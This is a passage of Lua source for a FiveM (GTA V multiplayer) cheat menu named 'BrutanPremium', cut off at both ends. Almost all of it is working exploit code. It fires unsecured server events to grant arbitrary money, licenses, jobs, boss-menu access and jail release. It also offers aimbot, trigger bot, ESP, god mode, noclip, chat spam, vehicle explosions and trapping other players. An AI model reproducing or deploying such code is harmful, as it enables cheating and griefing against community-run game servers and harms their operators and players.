				elseif BrutanPremium.CheckBox(
                "~p~Night Vision",
                nightVision,
                function(enabled)
                    nightVision = enabled
                    SetNightvision(nightVision)
                end)
                then
				elseif BrutanPremium.CheckBox(
				    "Christmas Weather",
					XMAS,
					function(enabled)
					XMAS = enabled
					end)
					then
				elseif BrutanPremium.CheckBox(
				    "Foggy Weather",
					FOGGY,
					function(enabled)
					FOGGY = enabled
					end)
					then
				elseif BrutanPremium.CheckBox(
				    "Clear Weather",
					CLEAR,
					function(enabled)
					CLEAR = enabled
					end)
					then
				elseif BrutanPremium.CheckBox(
				    "Blizzard Weather",
					BLIZZARD,
					function(enabled)
					BLIZZARD = enabled
					end)
					then
				elseif BrutanPremium.CheckBox(
				    "Extra Sunny Weather",
					EXTRASUNNY,
					function(enabled)
					EXTRASUNNY = enabled
					end)
					then
				elseif BrutanPremium.Button("Time set to night") then
				NetworkOverrideClockTime(23, 50, 0)
				elseif BrutanPremium.Button("Time set to day") then
				NetworkOverrideClockTime(12, 12, 0)
				elseif BrutanPremium.Button("Wall-in Legion Square") then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e8 = -145066854
                    RequestModel(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(0)
                    end
                    local e9 = CreateObject(e8, 258.91, -933.1, 26.21, true, true, false)
                    local ea = CreateObject(e8, 200.91, -874.1, 26.21, true, true, false)
					local e92 = CreateObject(e8, 126.52, -933.2, 26.21, true, true, false)
					local ea2 = CreateObject(e8, 184.52, -991.2, 26.21, true, true, false)
                    SetEntityHeading(e9, 158.41)
                    SetEntityHeading(ea, 90.51)
					SetEntityHeading(e92, 332.41)
                    SetEntityHeading(ea2, 260.51)
                    FreezeEntityPosition(e9, true)
                    FreezeEntityPosition(ea, true)
					FreezeEntityPosition(e92, true)
                    FreezeEntityPosition(ea2, true)
                elseif BrutanPremium.CheckBox(
                    "AimBot",
                    LOJ38,
                    function(enabled)
                        LOJ38 = enabled
                    end)
                then
                elseif BrutanPremium.MenuButton('~r~→  ~s~ESP Menu', 'LulxDJ') then
				elseif BrutanPremium.CheckBox(
				"~g~EMP ~s~All Nearby Vehicles",
				destroyvehicles,
				function(enabled)
				destroyvehicles = enabled
				end) 
			then
				elseif BrutanPremium.CheckBox(
				"~r~Explode ~s~All Nearby Vehicles",
				explodevehicles,
				function(enabled)
				explodevehicles = enabled
				end) 
			then
                elseif BrutanPremium.CheckBox(
                    "Trigger Bot",
                    TriggerBot,
                    function(enabled)
                        TriggerBot = enabled
                    end)
                then
				 elseif
                    BrutanPremium.CheckBox(
                        'Chat Spam',
                        chatspam,
                        function(enabled)
                            chatspam = enabled
                        end
                    )
                 then

                end

                BrutanPremium.Display()
			elseif BrutanPremium.IsMenuOpened('LulxDJ') then
                if
                    BrutanPremium.CheckBox(
                        '~h~~r~ESP ~s~MasterSwitch',
                        esp,
                        function(enabled)
                            esp = enabled
                        end
                    )
                 then
                elseif
                    BrutanPremium.CheckBox(
                        '~h~~r~ESP ~s~Box',
                        jfjfjffuhguh,
                        function(enabled)
                            jfjfjffuhguh = enabled
                        end
                    )
                 then
                elseif
                    BrutanPremium.CheckBox(
                        '~h~~r~ESP ~s~Info',
                        KDOWJDw,
                        function(enabled)
                            KDOWJDw = enabled
                        end
                    )
                 then
                elseif
                    BrutanPremium.CheckBox(
                        '~h~~r~ESP ~s~Lines',
                        jfjfjf,
                        function(enabled)
                            jfjfjf = enabled
                        end
                    )
                 then
                end
                BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened("ESXMenu") then
                if BrutanPremium.MenuButton("~r~→  ~s~ESX Money Options", "ESXMoneyMenu") then
                elseif BrutanPremium.MenuButton("~r~→  ~s~ESX Job Menu", "ESXJobMenu") then
                elseif BrutanPremium.MenuButton("~r~→  ~s~ESX Boss", "ESXBossMenu") then
                elseif BrutanPremium.MenuButton("~r~→  ~s~ESX Drugs", "ESXDrugMenu") then
                elseif BrutanPremium.MenuButton("~r~→  ~s~ESX Misc", "ESXMiscMenu") then
                end

                BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened("ESXMiscMenu") then
                if BrutanPremium.Button("ESX Harvest FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startHarvest")
				elseif BrutanPremium.Button    ("ESX Get all licenses ") then
					TriggerServerEvent("dmv:success")
					TriggerServerEvent('esx_weashopjob:addLicense', 'tazer')
					TriggerServerEvent('esx_weashopjob:addLicense', 'ppa')
					TriggerServerEvent('esx_weashopjob:addLicense', 'ppa2')
					TriggerServerEvent('esx_weashopjob:addLicense', 'drive_bike')
					TriggerServerEvent('esx_weashopjob:addLicense', 'drive_truck')
					TriggerServerEvent('esx_dmvschool:addLicense', 'dmv')
					TriggerServerEvent('esx_dmvschool:addLicense', 'drive')
					TriggerServerEvent('esx_dmvschool:addLicense', 'drive_bike')
					TriggerServerEvent('esx_dmvschool:addLicense', 'drive_truck')
					TriggerServerEvent('esx_airlines:addLicense', 'helico')
					TriggerServerEvent('esx_airlines:addLicense', 'avion')
                elseif BrutanPremium.Button("ESX Craft FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startCraft")
                end

                BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened("ESXDrugMenu") then
                if BrutanPremium.Button("Harvest Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                elseif BrutanPremium.Button("Transform Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                elseif BrutanPremium.Button("Sell Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                elseif BrutanPremium.Button("Harvest Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                elseif BrutanPremium.Button("Transform Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                elseif BrutanPremium.Button("Sell Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                elseif BrutanPremium.Button("Harvest Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                elseif BrutanPremium.Button("Transform Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                elseif BrutanPremium.Button("Sell Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                elseif BrutanPremium.Button("Harvest Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                elseif BrutanPremium.Button("Transform Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                elseif BrutanPremium.Button("Sell Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent ("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                elseif BrutanPremium.Button("Money Wash (x10)") then
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                elseif BrutanPremium.Button("Stop all (Drugs)") then
                    TriggerServerEvent("esx_drugs:stopHarvestCoke")
                    TriggerServerEvent("esx_drugs:stopTransformCoke")
                    TriggerServerEvent("esx_drugs:stopSellCoke")
                    TriggerServerEvent("esx_drugs:stopHarvestMeth")
                    TriggerServerEvent("esx_drugs:stopTransformMeth")
                    TriggerServerEvent("esx_drugs:stopSellMeth")
                    TriggerServerEvent("esx_drugs:stopHarvestWeed")
                    TriggerServerEvent("esx_drugs:stopTransformWeed")
                    TriggerServerEvent("esx_drugs:stopSellWeed")
                    TriggerServerEvent("esx_drugs:stopHarvestOpium")
                    TriggerServerEvent("esx_drugs:stopTransformOpium")
                    TriggerServerEvent("esx_drugs:stopSellOpium")
                end


                BrutanPremium.Display()
-- 4x482
            elseif BrutanPremium.IsMenuOpened("ESXBossMenu") then
                if BrutanPremium.Button("~c~Mechanic~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mecano', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif BrutanPremium.Button("~b~Police~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif BrutanPremium.Button("~r~Ambulance~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif BrutanPremium.Button("~y~Taxi~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'taxi', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif BrutanPremium.Button("~g~Real Estate~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif BrutanPremium.Button("~p~Gang~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'gang', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif BrutanPremium.Button("~o~Car Dealer~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif BrutanPremium.Button("~y~Banker~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'banker', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif BrutanPremium.Button("~c~Mafia~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mafia', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif BrutanPremium.Button("~g~ESX ~y~Custom Boss Menu") then
					local result = KeyboardInput("Enter Boss Menu Script Name", "", 10)
					if result then
						TriggerEvent('esx_society:openBossMenu', result, function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
					end
				end

                BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened("ESXJobMenu") then
                if BrutanPremium.Button("Unemployed") then
                    TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(-1))
                elseif BrutanPremium.Button("Police") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"police",3)
                elseif BrutanPremium.Button("Mechanic") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"mecano",3)
                elseif BrutanPremium.Button("Taxi") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"taxi",3)
                elseif BrutanPremium.Button("Ambulance") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"ambulance",3)
                elseif BrutanPremium.Button("Real Estate Agent") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"realestateagent",3)
                elseif BrutanPremium.Button("Car Dealer") then
                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"cardealer",3)
                end

                BrutanPremium.Display()
                        elseif BrutanPremium.IsMenuOpened("ESXMoneyMenu") then
                if BrutanPremium.Button("-» Ultimate moneymaker «-") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				TriggerServerEvent('vrp_slotmachine:server:2', result)
				TriggerServerEvent("esx_pizza:pay", result)
				TriggerServerEvent('esx_jobs:caution', 'give_back', result)
				TriggerServerEvent('lscustoms:payGarage', result)
				TriggerServerEvent('esx_tankerjob:pay', result)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', result)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', result)
				TriggerServerEvent('gambling:spend', result)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', result)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				TriggerServerEvent('AdminMenu:giveBank', result)
				TriggerServerEvent('AdminMenu:giveCash', result)
				TriggerServerEvent('esx_slotmachine:sv:2', result)
				TriggerServerEvent('esx_truckerjob:pay', result)
				TriggerServerEvent('esx_moneywash:deposit', result)
				TriggerServerEvent('esx_moneywash:withdraw', result)
				TriggerServerEvent('esx_moneywash:deposit', result)
			    TriggerServerEvent('mission:completed', result)
				TriggerServerEvent('truckerJob:success',result)-- 4x482
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', result)
				TriggerServerEvent('99kr-burglary:addMoney', result)
				end
			elseif BrutanPremium.Button("~g~Caution give back $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent("esx_jobs:caution", "give_back", result)
				end
			elseif BrutanPremium.Button("~g~Truckerjob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif BrutanPremium.Button("~g~Admin give bank $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveBank', result)
				end
			elseif BrutanPremium.Button("~g~Admin give cash $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveCash', result)
				end
			elseif BrutanPremium.Button("~g~Postal job $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			elseif BrutanPremium.Button("~g~Bank security $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			elseif BrutanPremium.Button("~g~Slotmachine $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			elseif BrutanPremium.Button("~g~ LScustoms $") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
				end		
			elseif BrutanPremium.Button("~g~Slotmachine(2) $") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("vrp_slotmachine:server:2", result)
				end
			elseif BrutanPremium.Button("~g~Dirty money $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				end
			elseif BrutanPremium.Button("~g~Delivery $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('delivery:success', result)
				end
			elseif BrutanPremium.Button("~g~Taxijob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent ('taxi:success', result)
				end
			elseif BrutanPremium.Button("~g~Taxijob 10.000x $") then
				a=1 repeat TriggerServerEvent('esx_taxijob:success') a=a+1 until (a>10000)
			elseif BrutanPremium.Button("~g~Pilot & Taxi (~g~ESX~s~) $") then
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
			elseif BrutanPremium.Button("~g~Garbagejob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_garbagejob:pay", result)
				end	
			elseif BrutanPremium.Button("~g~Paycheck $") then
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				end

                BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened("SelfMenu") then
			if BrutanPremium.MenuButton("~r~→  ~s~Ped Menu", "PedMenu") then
                                elseif BrutanPremium.Button("~g~Heal ~s~Yourself") then
                    SetEntityHealth(PlayerPedId(), 200)
                elseif BrutanPremium.Button("Get Some ~b~Armor") then
                    SetPedArmour(PlayerPedId(), 200)
				elseif BrutanPremium.Button("Go Invisible") then
				local model2 = GetHashKey("mp_m_niko_01")
				local player2 = PlayerId()
				local playerPed = GetPlayerPed(-1)
				 RequestModel(model2)
     while not HasModelLoaded(model2) do
        Wait(100)
    end

    SetPlayerModel(player2, model2)
    SetModelAsNoLongerNeeded(model2)
					elseif BrutanPremium.Button("Go Visible Again") then
				local model3 = GetHashKey("mp_m_freemode_01")
				local player3 = PlayerId()
				local playerPed = GetPlayerPed(-1)
				 RequestModel(model3)
     while not HasModelLoaded(model3) do
        Wait(100)
    end

    SetPlayerModel(player3, model3)
		SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model3)
                elseif BrutanPremium.Button("~o~Food~s~ & ~b~Water ~s~100% (~g~ESX~s~)") then
                    TriggerEvent("esx_status:set", "hunger", 1000000)
                    TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif BrutanPremium.Button("Get Some $ ~g~(~g~ESX~s~)") then
				TriggerServerEvent("esx_godirtyjob:pay", 500000)
				TriggerServerEvent("esx_pizza:pay", 500000)
				TriggerServerEvent("esx_slotmachine:sv:2", 500000)
				TriggerServerEvent("esx_banksecurity:pay", 500000)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', 500000)
				TriggerServerEvent('AdminMenu:giveBank', 500000)        
				TriggerServerEvent("AdminMenu:giveCash", 500000)
				TriggerServerEvent("esx_gopostaljob:pay", 500000)
				TriggerServerEvent("AdminMenu:giveBank", 500000)
				TriggerServerEvent("esx_truckerjob:pay", 500000)
				TriggerServerEvent("esx_carthief:pay", 500000)
			    TriggerServerEvent("esx_garbagejob:pay", 500000)
				TriggerServerEvent("esx_ranger:pay", 500000)
				TriggerServerEvent("esx_truckersjob:payy", 500000)
				PlaySoundFrontend(-1, "ROBBERY_MONEY_TOTAL", "HUD_FRONTEND_CUSTOM_SOUNDSET", true)
				drawNotification("~g~KA-CHING $$")
				elseif BrutanPremium.Button("Get some $ ~b~(VRP)") then
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				drawNotification("~g~KA-CHING $$")
                elseif BrutanPremium.Button("Revive yourself (~g~ESX~s~)") then
                    TriggerEvent("esx_ambulancejob:revive")
					TriggerEvent("ambulancier:selfRespawn")
				elseif BrutanPremium.Button("Open Jail Menu (~g~ESX~s~)") then
					TriggerEvent("esx-qalle-jail:openJailMenu")
                elseif BrutanPremium.Button("Get Out Of Jail (~g~ESX~s~)") then
                    local ped = PlayerPedId(-1)
                    TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(ped),0,"escaperino")
                    TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(ped),0)
                    TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(ped),0)
					TriggerServerEvent("esx_jailer:unjailTime", -1)
					TriggerServerEvent("JailUpdate", 0)
					TriggerEvent("UnJP")
                    TriggerServerEvent("js:jailuser",GetPlayerServerId(ped),0,"escaperino")
                elseif BrutanPremium.Button("~r~Kys") then
                    SetEntityHealth(PlayerPedId(), 0)
                elseif  BrutanPremium.CheckBox(
                    "God-Mode",
                    godmode,
                    function(enabled)
                    godmode = enabled
                    end)
                then
				elseif BrutanPremium.CheckBox(
                    "~o~Nuke ~s~Punches",
                    explosiveAmmo,
                    function(enabled)
                        explosiveAmmo = enabled
                    end)
                then
                elseif BrutanPremium.CheckBox(
                    "Never Get Tired",
                    infStamina,
                    function(enabled)
                    infStamina = enabled
                    end)
                then
                elseif BrutanPremium.CheckBox(
                    "Fast Run",
                    fastrun,
                    function(enabled)
                        fastrun = enabled
                    end)
                then
                elseif BrutanPremium.CheckBox(
                    "Super Jump",
                    SuperJump,
                    function(enabled)
                        SuperJump = enabled
                    end)
                then
                elseif BrutanPremium.CheckBox(
                    "Noclip",
                    Noclip,
                    function(enabled)
                        Noclip = enabled
                    end)
                then
                end

                BrutanPremium.Display()
			elseif BrutanPremium.IsMenuOpened("PedMenu") then
				if BrutanPremium.ComboBox("MalePed", peds2, currentPedd, selectedPedd, function(currentIndex, selectedIndex)
                    currentPedd = currentIndex
                    selectedPedd = selectedIndex
                end)
                then
				elseif BrutanPremium.ComboBox("FemalePed", peds3, currentPeddd, selectedPeddd, function(currentIndex, selectedIndex)
                    currentPeddd = currentIndex
                    selectedPeddd = selectedIndex
                end)
                then
				elseif BrutanPremium.ComboBox("AnimalPed", peds4, currentPedddd, selectedPedddd, function(currentIndex, selectedIndex)
                    currentPedddd = currentIndex
                    selectedPedddd = selectedIndex
                end)
                then
			elseif BrutanPremium.Button("Change To Selected ~b~Male") then
					Deer.Destroy()
		Wait(100)
				local model1 = GetHashKey(peds2[selectedPedd])
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model1)
    while not HasModelLoaded(model1) do
        Wait(100)
    end

    SetPlayerModel(player1, model1)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model1)
	elseif BrutanPremium.Button("Change To Selected ~p~Female") then
		Deer.Destroy()
		Wait(100)
				local model5 = GetHashKey(peds3[selectedPeddd])
				local player5 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model5)
    while not HasModelLoaded(model5) do
        Wait(100)
    end

    SetPlayerModel(player5, model5)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model5)
	elseif BrutanPremium.Button("Change To Selected ~y~Animal") then
			Deer.Destroy()
		Wait(100)
				local model6 = GetHashKey(peds4[selectedPedddd])
				local player6 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model6)
    while not HasModelLoaded(model6) do
        Wait(100)
    end

    SetPlayerModel(player6, model6)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model6)
		elseif BrutanPremium.Button("Spawn A ~y~Deer ~s~And Ride It") then
     Deer.Create()
	Citizen.Wait(150)
	 Deer.Ride()
				elseif BrutanPremium.Button("Change To FiveM Ped") then
						Deer.Destroy()
		Wait(100)
				local model3 = GetHashKey("mp_m_freemode_01")
				local player3 = PlayerId()
				local playerPed = GetPlayerPed(-1)
				 RequestModel(model3)
     while not HasModelLoaded(model3) do
        Wait(100)
    end

    SetPlayerModel(player3, model3)
	SetPedDefaultComponentVariation(GetPlayerPed(-1))
    SetModelAsNoLongerNeeded(model3)
	elseif BrutanPremium.Button("Change To ~y~Trevor") then
			Deer.Destroy()
		Wait(100)
				local model13 = GetHashKey("player_two")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model13)
    while not HasModelLoaded(model13) do
        Wait(100)
    end

    SetPlayerModel(player1, model13)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model1)
	elseif BrutanPremium.Button("Change To ~b~Michael") then
			Deer.Destroy()
		Wait(100)
				local model12 = GetHashKey("player_zero")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model12)
    while not HasModelLoaded(model12) do
        Wait(100)
    end

    SetPlayerModel(player1, model12)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model12)
	elseif BrutanPremium.Button("Change To ~g~Franklin") then
			Deer.Destroy()
		Wait(100)
				local model11 = GetHashKey("player_one")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model11)
    while not HasModelLoaded(model11) do
        Wait(100)
    end

    SetPlayerModel(player1, model11)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model11)
	elseif BrutanPremium.Button("Change To ~r~Alien") then
			Deer.Destroy()
		Wait(100)
				local model121 = GetHashKey("s_m_m_movalien_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model121)
    while not HasModelLoaded(model121) do
        Wait(100)
    end

    SetPlayerModel(player1, model121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model121)
	elseif BrutanPremium.Button("Change To ~h~Bigfoot") then
			Deer.Destroy()
		Wait(100)
				local model122 = GetHashKey("ig_orleans")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model122)
    while not HasModelLoaded(model122) do
        Wait(100)
    end

    SetPlayerModel(player1, model122)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model122)
	elseif BrutanPremium.Button("Change Clothes (~g~ESX~s~) (NOT TESTED)") then
    TriggerEvent('esx_skin:openSaveableMenu')
	end
	BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened("OnlinePlayersMenu") then
                    for i = 0, 128 do
